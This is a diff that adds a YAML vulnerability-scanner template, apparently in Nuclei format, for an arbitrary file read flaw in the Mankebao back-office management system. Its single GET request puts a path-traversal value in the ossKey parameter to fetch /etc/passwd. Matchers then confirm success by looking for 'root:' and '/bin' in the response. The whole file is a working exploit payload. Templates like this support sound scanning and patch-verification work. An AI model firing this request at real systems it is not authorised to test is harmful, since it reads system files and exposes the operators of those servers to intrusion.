@@ -1,0 +1,33 @@
+id: poc-yaml-mankebao-bms-downloadstockinfile-anyfile-read
+info:
+  name: 满客宝后台管理系统 downLoadStockInFile 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "/warehouse/api/v1/stockIn/downLoadStockInFile.swagger?fileName=&ossKey=/../../../../../../../../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: header
+        words:
+          - "attachment;filename="
+      - type: word
+        part: header
+        words:
+          - "image/jpeg"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
